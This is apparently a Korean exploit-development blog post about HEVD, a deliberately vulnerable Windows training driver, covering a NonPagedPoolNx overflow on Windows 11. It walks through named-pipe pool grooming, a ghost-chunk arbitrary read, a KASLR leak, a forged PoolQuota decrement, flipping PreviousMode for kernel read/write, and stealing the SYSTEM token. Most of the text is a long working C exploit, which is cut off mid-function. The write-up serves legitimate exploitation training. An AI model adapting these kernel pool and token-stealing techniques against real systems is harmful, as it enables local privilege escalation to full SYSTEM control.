---
title: "[HEVD] Buffer Overflow NonPagedPool NX"
categories: [Windows Kernel]
---

## 1. Vulnerability Research

환경 : Win11 23H2

```c
// TriggerBufferOverflowNonPagedPoolNx (decompiled)
PoolWithTag = ExAllocatePoolWithTag(NonPagedPoolNx, 0x1F0, 'kcaH'); // 고정 0x1F0 할당
ProbeForRead(UserBuffer, 0x1F0, 1);                                 // 0x1F0 까지만 검증
memmove(PoolWithTag, UserBuffer, Size);                            // Size = 유저 통제, 검증 없음
```

1. 커널 버퍼는 `0x1F0` 고정인데 `memmove`의 `Size`가 유저 통제
2. **경계 검사 없음**. `Size > 0x1F0`이면 인접 청크로 넘침

- 청크 총 크기 = `0x1F0 + 0x10(POOL_HEADER) = 0x200`
- 덮을 수 있는 것 = **바로 뒤 청크의 헤더 + 데이터**

---

## 2. Attack Scenario

읽기밖에 없는 상태에서 SYSTEM까지 가려면 다단계 우회가 필요함. 큰 그림:

```
[① Ghost Chunk]  CacheAligned confusion → 안정적 임의읽기 확보
        │
[② KASLR Leak]   객체 체인 타고 ntoskrnl 베이스 + 쿠키 + EPROCESS/KTHREAD
        │
[③ PoolQuota 임의감소]  쿼터 환불 로직 하이재킹 → 임의 주소 -1
        │
[④ PreviousMode 1→0]   KTHREAD.PreviousMode 감소 → NtWriteVirtualMemory가 커널 R/W로 승격
        │
[⑤ 토큰 스틸]    SYSTEM 토큰을 내 EPROCESS.Token에 복사 → SYSTEM
        │
[정리]  VS 헤더 복구(0x139 회피) + PreviousMode 원복 → SYSTEM 셸
```

---

## 3. 그루밍 도구 — named pipe / NP_DATA_QUEUE_ENTRY

### 3.1 WriteFile 하나 = 풀 할당 하나

파이프는 "쓴 데이터를 **읽기 전까지 커널이 보관**"해야 함. 그 보관 장소가 NonPagedPoolNx 청크(`NP_DATA_QUEUE_ENTRY`).

```
npfs!NpAddDataQueueEntry:
    entry = ExAllocatePool2(NonPagedPoolNx, sizeof(NDQE) + N, 'NpFr');
    memcpy(entry->data, userbuf, N);
    entry->DataSize = N;
    파이프의 DataQueue에 연결
```

즉 유저모드 `WriteFile` 한 줄 = 커널 풀에 청크 alloc + 내 데이터로 채움. 청크 총 크기 = `VS(0x10) + POOL(0x10) + NDQE(0x30) + 데이터(N)` → **write 바이트 수로 청크 크기를 정확히 제어** 가능.

> 리더가 이미 대기 중이면 데이터를 그 버퍼로 바로 복사하고 할당 안 함. 그루밍에선 동시 read를 안 하니 매 write마다 할당됨.

### 3.2 파이프 3연산 = malloc / free / read

파이프의 세 호출이 힙 조작에 그대로 대응됨:

| 유저모드 호출          | 커널 동작                       | 힙 관점           |
| ---------------------- | ------------------------------- | ----------------- |
| `WriteFile(N)`         | NDQE 청크 alloc + 데이터 채움   | **malloc**        |
| `ReadFile` (전부 소비) | 큐에서 빼고 `ExFreePoolWithTag` | **free**          |
| `PeekNamedPipe`        | 데이터 복사만 (소비 X)          | **read (비파괴)** |

이 세 개로 풀을 원하는 크기로 채우고(spray), 골라서 뚫고(hole), 내용을 다시 읽어올(peek) 수 있음.

---

## 4. Ghost Chunk — 안정적 임의읽기

### 4.1 문제: 파이프 metadata는 커널 소유

임의읽기를 하려면 NDQE를 `EntryType=1`(unbuffered) + `Irp=가짜IRP`로 만들어야 함. 그래야 `PeekNamedPipe`가 `Irp->SystemBuffer`의 임의 주소를 읽어줌.

```
NP_DATA_QUEUE_ENTRY:
  +0x10 Irp            ┐
  +0x20 DataEntryType  │  ← 커널이 세팅. 유저는 못 건드림
  +0x28 DataSize       ┘
  +0x30 data           ← WriteFile로 제어하는 유일한 부분
```

문제: **metadata(Irp/EntryType)는 커널 소유**. `WriteFile`은 `data`만 바꾸기 때문에 정상 파이프론 임의읽기 불가능.

### 4.2 CacheAligned Confusion을 통한 청크 겹침 유도

오버플로우로 victim 청크의 `POOL_HEADER`에 두 개를 심음:

```c
overflow_chunk.pool_header.PoolType     = 0x4;   // CacheAligned 위조로 정렬되었다고 free를 속임
overflow_chunk.pool_header.PreviousSize = 0x1D;  // 앞 청크 역산값 위조
```

free 시 커널은 CacheAligned를 보고 **청크 base를 재계산**, `PreviousSize`로 **앞 청크를 역산**해서 coalescing 하려 함. 둘 다 가짜라 경계를 오산시켜 free-list에 **이전 청크까지 덮는 어긋난 빈 블록**이 등록됨.

그 크기로 재할당하면 **이전 청크와 물리적으로 겹치는 유령 청크(ghost)** 생성.

청크 레이아웃 :

```
                ghost-0x50   ghost         ghost+0x1C0        ghost+0x3F0
  P(이전,살아있음): [VS][POOL][NDQE][──── P의 data ────]
  G(유령):                    [VS][POOL][NDQE][────── G의 data ──────]
                              └─ G의 헤더가 P의 data 안에 겹침 ─┘
```

### 4.3 lookaside를 통한 검증 우회 및 결정론화

free 한 번으로 겹침이 생기는 게 아니라 **free로 free-list 오염을 통해 alloc으로 실체화**하는 2단 동작. 이때 배경 지식(0.4)의 **lookaside를 활성화 시켜야** 함:

- 오염 청크 free가 **VS 검증을 안 거치기 때문에** `0x139` (BSOD) 안 남
- **LIFO 재사용** → 방금 free한 오염 슬롯을 다음 alloc이 그대로 받음 → 겹침 확정

`enableLookaside(...)`가 victim/ghost/vuln 크기를 `0x10000`씩 dynamic lookaside를 켠 뒤 진행함.

### 4.4 안정적 arbitary read

```c
// P에 write하면 G의 NDQE metadata가 유저랜드에서 세팅됨
fake.np_data_queue_entry.Irp           = (uintptr_t)&g_fake_irp; // 유저랜드 가짜 IRP
fake.np_data_queue_entry.DataEntryType = 1;                      // unbuffered
fake.np_data_queue_entry.DataSize      = 0xffffffff;             // 복사량 상한 안 걸리게

// 반복 호출 가능한 안정적 primitive
void ArbitraryRead(ghost, where, out, size) {
    g_fake_irp.SystemBuffer = where;   // 읽고 싶은 커널 주소
    PeekNamedPipe(ghost, buf, size);   // 커널: EntryType=1 → Irp->SystemBuffer(=where)에서 복사
    memcpy(out, buf, size);
}
```

`g_fake_irp`는 유저랜드 전역. IRP의 `SystemBuffer(+0x18)`만 바꿔가며 아무 커널 주소나 읽음. **오버플로우 재트리거 없이 무한 반복 읽기 가능** → ghost chunk를 쓰는 이유.

---

## 5. KASLR Leak

안정적 arbitary read로 객체 체인을 타고 ntoskrnl 베이스까지 감. 시작점은 Ghost NDQE의 Flink.

```
① Ghost NDQE.Flink            = &NP_CCB.DataQueue  (NP_CCB+0x48)   ← 1차 KASLR
② NP_CCB+0x48 -0x48 +0x30    = NP_CCB.FileObject → FILE_OBJECT
③ FILE_OBJECT +0x8           = DEVICE_OBJECT
④ DEVICE_OBJECT +0x8         = DRIVER_OBJECT
⑤ DRIVER_OBJECT +0x18        = DriverStart = npfs 베이스
⑥ npfs 베이스 + npfs IAT RVA = IAT 슬롯 → nt!ExFreePoolWithTag 실주소
⑦ 실주소 - nt RVA            = ntoskrnl 베이스
```

`DataQueue`와 `FileObject`는 **같은 NP_CCB 구조체의 필드**. leak한 DataQueue 주소에서 `0x48` 빼서 NP_CCB 베이스, 거기 `+0x30`으로 FileObject 접근.

ntoskrnl 베이스 확보 후 나머지 leak:

- `ExpPoolQuotaCookie`, `RtlpHpHeapGlobals` — ③에 필요
- `PsInitialSystemProcess` → SYSTEM EPROCESS
- `ActiveProcessLinks`(0x448) 순회 → 내 EPROCESS → `ThreadListHead`(KPROCESS 0x30) → 내 KTHREAD

> anchor 함수 주의 : npfs는 22H2에서 `ExAllocatePoolWithTag`를 import 안 함(`ExAllocatePool2` 사용). 커널 베이스 계산 anchor는 npfs가 실제 import하는 **`ExFreePoolWithTag`**로 잡아야 함.

---

## 6. PoolQuota 임의감소

### 6.1 왜 quota인가

이 시점에 우리 손엔 **임의읽기 + POOL_HEADER 제어(ghost) + free 유발**만 존재하고, 쓰기 primitive가 없음.

pool quota의 **감소** 가 정확히 그 역할을 함 :

```
quota 청크 free → 커널이 ProcessBilled가 가리키는 프로세스의 QuotaBlock에서 크기만큼 빼기(=메모리에 씀)
```

우리가 이미 가진 **POOL_HEADER 제어 + free 유발**로 이 빼기를 임의 주소로 유도 가능.

### 6.2 ProcessBilled 인코딩

quota 청크는 청구 대상 EPROCESS를 `POOL_HEADER.ProcessBilled`에 XOR 인코딩 저장 :

```
저장값 = EPROCESS ⊕ 청크주소 ⊕ ExpPoolQuotaCookie
```

free 시 복호화: `EPROCESS = 저장값 ⊕ 청크주소 ⊕ 쿠키`. 세 값을 arb read로 다 아니 **역으로 위조** 가능 :

```
위조 ProcessBilled = 가짜EPROCESS ⊕ 청크주소 ⊕ 쿠키
→ 복호화하면 커널이 "가짜EPROCESS"를 청구 대상으로 인식
```

이 위조 헤더는 **유령 청크의 POOL_HEADER**에 넣음 (겹침 덕에 유저 제어 가능).

### 6.3 왜 "가짜 EPROCESS"가 필요한가

감소가 떨어지는 최종 주소는 `ProcessBilled` 자체가 아니라 **2단 역참조** 너머임 :

```
ProcessBilled ─(복호화)─► EPROCESS ─(+0x568)─► QuotaBlock ─► 여기서 -1
```

target을 조준하려면 `EPROCESS->QuotaBlock` 값이 target이어야 함. 근데 그건 EPROCESS 안의 필드 → **진짜 EPROCESS에서 하려면 그 필드를 덮어써야 하고, 그게 곧 임의쓰기(없음)**.

해결: 진짜 대신 **가짜 EPROCESS를 파이프 내용 제어로 만들고**, 그 `QuotaBlock(+0x568)`에 처음부터 target을 넣기.

```c
setupFakeEprocess:
    fake[+0x0]   = 0x3            // Type (최소 유효성)
    fake[+0x568] = target - 1     // QuotaBlock = 우리 타겟(PreviousMode)
```

### 6.4 가짜 EPROCESS 주소 회수

가짜 EPROCESS를 ProcessBilled 위조에 넣으려면 그 **커널 주소**가 필요함. 파이프에 write하면 커널 어딘가에 생기는데 주소를 모름 → **Flink 추적**으로 회수 :

```c
WriteDataToPipe(previous_chunk_pipe, fake_eprocess_buf, 0x800); // entry2 생성 (가짜 EPROCESS 담김)
// 주소를 아는 entry1의 Flink를 arb read → entry2 주소
ArbitraryRead(ghost, prev_ndqe /*Flink*/, &new_ndqe, 8);
fake_eprocess = new_ndqe + 0x30 /*NDQE 헤더*/ + 0x50 /*버퍼 내 오프셋*/;
```

핵심 : **write로 데이터를 커널에 심고, 주소를 아는 엔트리의 Flink를 따라가 방금 심은 데이터의 주소를 회수**.

### 6.5 발동

```c
// 유령 POOL_HEADER에 PoolQuota 비트 + 위조 ProcessBilled → 유령 free
FreeNpDataQueueEntry(ghost, GHOST_CHUNK_SIZE);
```

free 순간 :

```
1. PoolQuota 비트 → ProcessBilled 복호화 → 가짜EPROCESS
2. 가짜EPROCESS->QuotaBlock (= target-1) 따라감
3. target에서 -1
```

= **임의 주소 -1**.

---

## 7. PreviousMode → 완전 임의쓰기

### 7.1 PreviousMode

`KTHREAD.PreviousMode`(0x232)는 **1바이트**. 현재 syscall이 어디서 왔는지 :

- **1 = UserMode** / **0 = KernelMode**

`NtRead/WriteVirtualMemory`가 이걸 검사 :

```
if (PreviousMode == UserMode)    // 1
    ProbeForRead/Write(주소);    // 커널주소면 거부
// KernelMode(0)면 probe 스킵 → 어떤 주소든 R/W
```

### 7.2 1→0 = 승격

⑥의 임의감소로 target을 `self_kthread + 0x232`로 잡으면 → **PreviousMode 1→0** (1바이트 감소가 UserMode→KernelMode에 딱 맞음). 이후:

```c
NtWriteVirtualMemory(GetCurrentProcess(), 커널주소, data, size);  // 커널 임의쓰기
ReadProcessMemory(GetCurrentProcess(), 커널주소, ...);            // 커널 임의읽기
```

좁은 감소 primitive가 **무제한 커널 R/W로 승격**됨. 이후 풀 트릭 불필요.

---

## 8. 토큰 스틸 + 정리

```c
// SYSTEM 토큰 읽어 내 프로세스에 덮기
uintptr_t system_token = Read64(system_eprocess + 0x4B8) & ~0xFull; // 참조카운트 비트 클리어
Write64(self_eprocess + 0x4B8, system_token);
```

이제 내 프로세스가 SYSTEM 토큰을 가짐 → `system("cmd.exe")`가 SYSTEM 상속.

**정리(BSOD 회피)**:

- `FixVsChunkHeaders` — 오버플로우/겹침으로 망가진 이전/다음 청크의 VS 헤더 `UnsafeSize`/`UnsafePrevSize`를 `⊕addr⊕RtlpHpHeapGlobals`로 재인코딩해 복구 → free 시 `0x139` 방지.
- `RestorePreviousMode` — PreviousMode 0→1 원복 (그 스레드가 정상 동작하기 위함).

---

## 9. Trouble Shooting

이 익스는 삽질의 연속이었음. 주요 지점만.

| 문제                                    | 원인                                                                                                      | 해결                                                                       |
| --------------------------------------- | --------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------- |
| kcaH가 파이프와 절대 인접 안 됨 (며칠)  | 비-Nx IOCTL은 **executable NonPagedPool(4KB)**, 파이프는 **NonPagedPoolNx(2MB large)** → 다른 세그먼트 힙 | IOCTL을 **Nx 버전 `0x22204B`**로 전환                                      |
| Nx로 옮겨도 인접 실패                   | `every-other free`가 LFH 교란                                                                             | 검증된 기법은 LFH 안 씀 → **VS + CacheAligned confusion**으로 전환         |
| 자작 relative read → 크래시             | 배치 랜덤 → `0x50 PAGE_FAULT` / Flink 조작 → 종료 시 `0x139`                                              | 재트리거식은 불안정 → **ghost chunk 안정적 read**로 전환                   |
| pending-read 엔트리로 arb write 시도    | `!poolused NpFr = 0`, async read는 groom 가능한 NpFr 안 만듦                                              | 전제 폐기 → **PoolQuota → PreviousMode** 경로로                            |
| RVA resolve 실패 (`ExpPoolQuotaCookie`) | 시그니처 패턴이 다른 빌드용                                                                               | WinDbg `? nt!X - nt`로 RVA 뽑아 **하드코딩**                               |
| RVA resolve 실패 (npfs import)          | npfs가 `ExAllocatePoolWithTag` import 안 함 (`ExAllocatePool2` 사용)                                      | anchor를 **`ExFreePoolWithTag`**로 교체                                    |
| 오프셋 검증                             | 참조는 다른 빌드                                                                                          | `dt nt!_EPROCESS/_KTHREAD`로 대조 (`Token 0x4B8`, `PreviousMode 0x232` 등) |

**재트리거식 primitive는 불안정**함. 안정적 R/W엔 **겹침(ghost)으로 반복 가능한 구조**가 필요하고, 빌드별 **오프셋/RVA는 반드시 대상 커널에서 직접 확인**해야 함.

---

## 10. Exploit Code

```c
#include <windows.h>
#include <winternl.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdarg.h>
#include <string.h>

#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL_NX IOCTL(0x812)
#define HEVD_DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"

#define EPROCESS_Type_OFFSET               0x0
#define EPROCESS_ThreadListHead_OFFSET     0x30
#define EPROCESS_UniqueProcessId_OFFSET    0x440
#define EPROCESS_ActiveProcessLinks_OFFSET 0x448
#define EPROCESS_Token_OFFSET              0x4B8
#define EPROCESS_QuotaBlock_OFFSET         0x568
#define KTHREAD_PreviousMode_OFFSET        0x232
#define KTHREAD_ThreadListEntry_OFFSET     0x2F8
#define FILE_OBJECT_DeviceObject_OFFSET    0x8
#define DEVICE_OBJECT_DriverObject_OFFSET  0x8
#define DRIVER_OBJECT_DriverStart_OFFSET   0x18
#define NP_CCB_FileObject_OFFSET           0x30
#define NP_CCB_DataQueue_OFFSET            0x48

#define SZ_VS_HDR   0x10
#define SZ_POOL_HDR 0x10
#define SZ_NDQE     0x30
#define NDQE_DATA_OFFSET 0x30
#define CALC_NDQE_DataSize(chunk_size) ((chunk_size) - SZ_VS_HDR - SZ_POOL_HDR - SZ_NDQE)
#define VULN_CHUNK_SIZE   0x210
#define VICTIM_CHUNK_SIZE 0x220
#define PREV_CHUNK_OFFSET (SZ_VS_HDR + SZ_POOL_HDR + SZ_NDQE)
#define NEXT_CHUNK_OFFSET (VICTIM_CHUNK_SIZE * 2 - PREV_CHUNK_OFFSET)
#define GHOST_CHUNK_SIZE  NEXT_CHUNK_OFFSET
#define GHOST_CHUNK_MARKER_1 0xDEADBEEFC0DECAFEULL
#define GHOST_CHUNK_MARKER_2 0xFACEFEEDCAFEBABEULL

#define FAKE_EPROCESS_SIZE   0x800
#define FAKE_EPROCESS_OFFSET 0x50
#define NUM_PIPES_SPRAY (0x80 * 10)

typedef struct _HEAP_VS_CHUNK_HEADER {
    uint16_t MemoryCost;
    uint16_t UnsafeSize;
    uint16_t UnsafePrevSize;
    uint8_t  Allocated;
    uint8_t  Unused1;
    uint8_t  EncodedSegmentPageOffset;
    uint8_t  Unused2[7];
} HEAP_VS_CHUNK_HEADER;

typedef struct _POOL_HEADER {
    uint8_t   PreviousSize;
    uint8_t   PoolIndex;
    uint8_t   BlockSize;
    uint8_t   PoolType;
    uint32_t  PoolTag;
    uintptr_t ProcessBilled;
} POOL_HEADER;

typedef struct _NP_DATA_QUEUE_ENTRY {
    LIST_ENTRY QueueEntry;
    uintptr_t  Irp;
    uintptr_t  ClientSecurityContext;
    uint32_t   DataEntryType;
    uint32_t   QuotaInEntry;
    uint32_t   DataSize;
    uint32_t   unknown;
} NP_DATA_QUEUE_ENTRY;

typedef struct _FAKE_IRP {
    uint64_t Unused[3];
    uint64_t SystemBuffer;
} FAKE_IRP;

typedef struct _vs_chunk {
    uintptr_t           encoded_vs_header[2];
    POOL_HEADER         pool_header;
    NP_DATA_QUEUE_ENTRY np_data_queue_entry;
} vs_chunk_t;

typedef struct _pipe_pair  { HANDLE write; HANDLE read; } pipe_pair_t;
typedef struct _pipe_group { size_t nb; size_t chunk_size; pipe_pair_t pipes[1]; } pipe_group_t;
typedef struct _exploit_pipes { pipe_pair_t ghost_chunk_pipe; pipe_pair_t previous_chunk_pipe; } exploit_pipes_t;

typedef struct _exploit_addresses {
    uintptr_t ghost_vs_chunk;
    uintptr_t np_ccb_data_queue;
    uintptr_t kernel_base;
    uintptr_t ExpPoolQuotaCookie;
    uintptr_t RtlpHpHeapGlobals;
    uintptr_t system_eprocess;
    uintptr_t self_eprocess;
    uintptr_t self_kthread;
} exploit_addresses_t;

FAKE_IRP g_fake_irp;
static char g_fpb_buf[sizeof(vs_chunk_t) + 0x8];
static vs_chunk_t *g_fake_process_billed_chunk = (vs_chunk_t*)g_fpb_buf;

DWORD g_nt_PsInitialSystemProcess_RVA = 0;
DWORD g_nt_ExFreePoolWithTag_RVA = 0;
DWORD g_nt_ExpPoolQuotaCookie_RVA = 0;
DWORD g_nt_RtlpHpHeapGlobals_RVA = 0;
DWORD g_Npfs_imp_ExFreePoolWithTag_RVA = 0;

typedef NTSTATUS (WINAPI *PNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
PNtWriteVirtualMemory pNtWriteVirtualMemory = NULL;

void ArbitraryRead(pipe_pair_t *ghost_pipe, uintptr_t where, char *out, size_t size);
uintptr_t Read64(uintptr_t address);
NTSTATUS  Write64(uintptr_t address, uintptr_t value);
NTSTATUS  ArbitraryWrite(uintptr_t address, char *value, size_t size);

int InitializeWindowsApiWrappers(void) {
    pNtWriteVirtualMemory = (PNtWriteVirtualMemory)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtWriteVirtualMemory");
    return pNtWriteVirtualMemory != NULL;
}

#define NT_KERNEL_PATH   "C:\\Windows\\System32\\ntoskrnl.exe"
#define NPFS_DRIVER_PATH "C:\\Windows\\System32\\drivers\\npfs.sys"

DWORD ResolveIATEntryRva(const char *modulePath, const char *importDll, const char *functionName) {
    HMODULE base = LoadLibraryExA(modulePath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!base) return 0;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);
    DWORD impRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    DWORD out = 0;
    if (impRva) {
        PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)base + impRva);
        for (; imp->Name; imp++) {
            char *dll = (char*)((BYTE*)base + imp->Name);
            if (_stricmp(dll, importDll) != 0) continue;
            DWORD iltRva = imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk;
            PIMAGE_THUNK_DATA ilt = (PIMAGE_THUNK_DATA)((BYTE*)base + iltRva);
            PIMAGE_THUNK_DATA iat = (PIMAGE_THUNK_DATA)((BYTE*)base + imp->FirstThunk);
            for (; ilt->u1.AddressOfData; ilt++, iat++) {
                if (ilt->u1.Ordinal & IMAGE_ORDINAL_FLAG) continue;
                PIMAGE_IMPORT_BY_NAME nm = (PIMAGE_IMPORT_BY_NAME)((BYTE*)base + ilt->u1.AddressOfData);
                if (strcmp((char*)nm->Name, functionName) == 0) { out = (DWORD)((BYTE*)iat - (BYTE*)base); break; }
            }
            break;
        }
    }
    FreeLibrary(base);
    return out;
}

DWORD ResolveEATEntryRva(const char *modulePath, const char *functionName) {
    HMODULE base = LoadLibraryExA(modulePath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!base) return 0;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);
    DWORD expRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD out = 0;
    if (expRva) {
        PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)base + expRva);
        PDWORD funcs = (PDWORD)((BYTE*)base + exp->AddressOfFunctions);
        PDWORD names = (PDWORD)((BYTE*)base + exp->AddressOfNames);
        PWORD  ords  = (PWORD)((BYTE*)base + exp->AddressOfNameOrdinals);
        for (DWORD i = 0; i < exp->NumberOfNames; i++) {
            char *nm = (char*)((BYTE*)base + names[i]);
            if (strcmp(nm, functionName) == 0) { out = funcs[ords[i]]; break; }
        }
    }
    FreeLibrary(base);
    return out;
}

BOOL ResolveKernelRvas(void) {
    g_nt_PsInitialSystemProcess_RVA = ResolveEATEntryRva(NT_KERNEL_PATH, "PsInitialSystemProcess");
    if (!g_nt_PsInitialSystemProcess_RVA) return FALSE;
    g_nt_ExFreePoolWithTag_RVA = ResolveEATEntryRva(NT_KERNEL_PATH, "ExFreePoolWithTag");
    if (!g_nt_ExFreePoolWithTag_RVA) return FALSE;
    g_nt_ExpPoolQuotaCookie_RVA = 0xD1DFB8;
    g_nt_RtlpHpHeapGlobals_RVA  = 0xC6AD80;
    g_Npfs_imp_ExFreePoolWithTag_RVA = ResolveIATEntryRva(NPFS_DRIVER_PATH, "ntoskrnl.exe", "ExFreePoolWithTag");
    if (!g_Npfs_imp_ExFreePoolWithTag_RVA) return FALSE;
    return TRUE;
}

HANDLE HevdOpenDeviceHandle(void) {
    HANDLE h = CreateFileA(HEVD_DEVICE_NAME, FILE_READ_ACCESS | FILE_WRITE_ACCESS,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
        FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) exit(1);
    return h;
}

int HevdTriggerBufferOverflowNonPagedPoolNx(HANDLE hHevd, char *overflow_buf, size_t overflow_size) {
    ULONG payload_len = 0x200 + (ULONG)overflow_size;
    LPVOID in = VirtualAlloc(NULL, payload_len + 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!in) return 0;
    memset(in, 0x41, payload_len);
    memcpy((char*)in + 0x200, overflow_buf, overflow_size);
    DWORD ret = 0;
    DeviceIoControl(hHevd, HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL_NX, in, payload_len, NULL, 0, &ret, NULL);
    VirtualFree(in, 0, MEM_RELEASE);
    return 1;
}

int WriteDataToPipe(const pipe_pair_t *p, const char *data, size_t n) {
    DWORD w = 0; return (p && data) ? WriteFile(p->write, data, (DWORD)n, &w, NULL) : 0;
}
int PeekDataFromPipe(const pipe_pair_t *p, char *out, size_t n) {
    DWORD r = 0; return (p && out) ? PeekNamedPipe(p->read, out, (DWORD)n, &r, NULL, NULL) : 0;
}
int readDataFromPipe(const pipe_pair_t *p, char *out, size_t n) {
    DWORD r = 0; return (p && out) ? ReadFile(p->read, out, (DWORD)n, &r, NULL) : 0;
}
int createPipePair(pipe_pair_t *p) {
    if (!p) return 0;
    return CreatePipe(&p->read, &p->write, NULL, 0xFFFFFFFF) ? 1 : 0;
}

pipe_pair_t AllocNpDataQueueEntry(size_t chunk_size, const char *pipe_data, size_t pipe_data_size) {
    pipe_pair_t pipe = { 0 };
    if (!createPipePair(&pipe)) return pipe;
    size_t bufsize = CALC_NDQE_DataSize(chunk_size);
    if (bufsize > 0x1000) return pipe;
    char buffer[0x1000];
    memset(buffer, 0x41, bufsize);
    if (pipe_data) memcpy(buffer, pipe_data, pipe_data_size);
    WriteDataToPipe(&pipe, buffer, bufsize);
    return pipe;
}

pipe_group_t *CreatePipeGroup(size_t nb, size_t chunk_size) {
    pipe_group_t *g = (pipe_group_t*)malloc(sizeof(pipe_group_t) + nb * sizeof(pipe_pair_t));
    if (!g) return NULL;
    g->nb = nb; g->chunk_size = chunk_size;
    return g;
}

pipe_group_t *SprayNpDataQueueEntry(size_t nb, size_t chunk_size, const char *pipe_data, size_t pipe_data_size) {
    pipe_group_t *g = CreatePipeGroup(nb, chunk_size);
    for (size_t i = 0; i < nb; i++)
        g->pipes[i] = AllocNpDataQueueEntry(chunk_size, pipe_data, pipe_data_size);
    return g;
}

int FreeNpDataQueueEntry(pipe_pair_t pipe, size_t chunk_size) {
    size_t n = CALC_NDQE_DataSize(chunk_size);
    if (!pipe.write || !pipe.read || n > 0x1000) return 0;
    char dummy[0x1000];
    return readDataFromPipe(&pipe, dummy, n) ? 1 : 0;
}

int ClosePipePairHandles(pipe_pair_t *p) {
    if (p->write) { CloseHandle(p->write); p->write = NULL; }
    if (p->read)  { CloseHandle(p->read);  p->read  = NULL; }
    return 1;
}

void DestroyPipeGroup(pipe_group_t *g) {
    for (size_t i = 0; i < g->nb; i++)
        if (g->pipes[i].read && g->pipes[i].write) ClosePipePairHandles(&g->pipes[i]);
    free(g);
}

pipe_group_t *createChunkHoles(void) {
    pipe_group_t *victim = SprayNpDataQueueEntry(NUM_PIPES_SPRAY, VICTIM_CHUNK_SIZE, NULL, 0);
    for (size_t i = 0; i < victim->nb; i += 3) {
        FreeNpDataQueueEntry(victim->pipes[i], VICTIM_CHUNK_SIZE);
        victim->pipes[i].read = NULL; victim->pipes[i].write = NULL;
    }
    return victim;
}

void setCacheAlignedFlagOnVictimChunk(void) {
    vs_chunk_t overflow_chunk;
    memset(&overflow_chunk, 0, sizeof(overflow_chunk));
    overflow_chunk.pool_header.PreviousSize = (uint8_t)(CALC_NDQE_DataSize(VICTIM_CHUNK_SIZE) / 0x10);
    overflow_chunk.pool_header.PoolIndex = 0;
    overflow_chunk.pool_header.BlockSize = 0;
    overflow_chunk.pool_header.PoolType = 0 | 4;
    HANDLE h = HevdOpenDeviceHandle();
    HevdTriggerBufferOverflowNonPagedPoolNx(h, (char*)&overflow_chunk, 0x14);
    CloseHandle(h);
    Sleep(2000);
}

void enableLookaside(int count, ...) {
    va_list ap;
    va_start(ap, count);
    for (int i = 0; i < count; i++) { size_t bs = va_arg(ap, size_t); SprayNpDataQueueEntry(0x10000, bs, NULL, 0); }
    va_end(ap);
    Sleep(2000);
    va_start(ap, count);
    for (int i = 0; i < count; i++) { size_t bs = va_arg(ap, size_t); SprayNpDataQueueEntry(0x10000, bs, NULL, 0); }
    va_end(ap);
    Sleep(1000);
    va_start(ap, count);
    for (int i = 0; i < count; i++) { size_t bs = va_arg(ap, size_t); SprayNpDataQueueEntry(0x100, bs, NULL, 0); }
    va_end(ap);
}

size_t scanPipesForGhostChunkLeak(pipe_group_t *fake_ph, vs_chunk_t *fake_vs, vs_chunk_t *leaked) {
    for (size_t i = 0; i < fake_ph->nb; i++) {
        char buf[0x1000]; memset(buf, 0, sizeof(buf));
        if (!PeekDataFromPipe(&fake_ph->pipes[i], buf, sizeof(vs_chunk_t))) exit(0);
        if (memcmp((char*)fake_vs, buf, sizeof(vs_chunk_t))) {
            memcpy(leaked, buf, sizeof(vs_chunk_t));
            return i;
        }
    }
    return (size_t)-1;
}

int createGhostChunk(exploit_pipes_t *pipes, exploit_addresses_t *addrs,
                     pipe_group_t *victim, pipe_group_t *fake_ph, vs_chunk_t *fake_vs) {
    pipe_group_t *cand = CreatePipeGroup(NUM_PIPES_SPRAY, GHOST_CHUNK_SIZE);
    uint64_t ghost_data = GHOST_CHUNK_MARKER_1;
    for (size_t gi = 0; gi < victim->nb; gi++) {
        FreeNpDataQueueEntry(victim->pipes[gi], VICTIM_CHUNK_SIZE);
        cand->pipes[gi] = AllocNpDataQueueEntry(GHOST_CHUNK_SIZE, (char*)&ghost_data, 0x8);

        vs_chunk_t leaked;
        size_t pi = scanPipesForGhostChunkLeak(fake_ph, fake_vs, &leaked);
        if (pi != (size_t)-1) {
            addrs->np_ccb_data_queue = (uintptr_t)leaked.np_data_queue_entry.QueueEntry.Flink;
            pipes->ghost_chunk_pipe = cand->pipes[gi];
            cand->pipes[gi].read = NULL; cand->pipes[gi].write = NULL;
            DestroyPipeGroup(cand);
            pipes->previous_chunk_pipe = fake_ph->pipes[pi];
            fake_ph->pipes[pi].read = NULL; fake_ph->pipes[pi].write = NULL;
            DestroyPipeGroup(fake_ph);
            return 1;
        }
        victim->pipes[gi] = AllocNpDataQueueEntry(VICTIM_CHUNK_SIZE, NULL, 0);
    }
    return 0;
}

void setFakeNpDataQueueEntry(exploit_pipes_t *pipes, exploit_addresses_t *addrs) {
    vs_chunk_t fake;
    memset(&fake, 0, sizeof(fake));
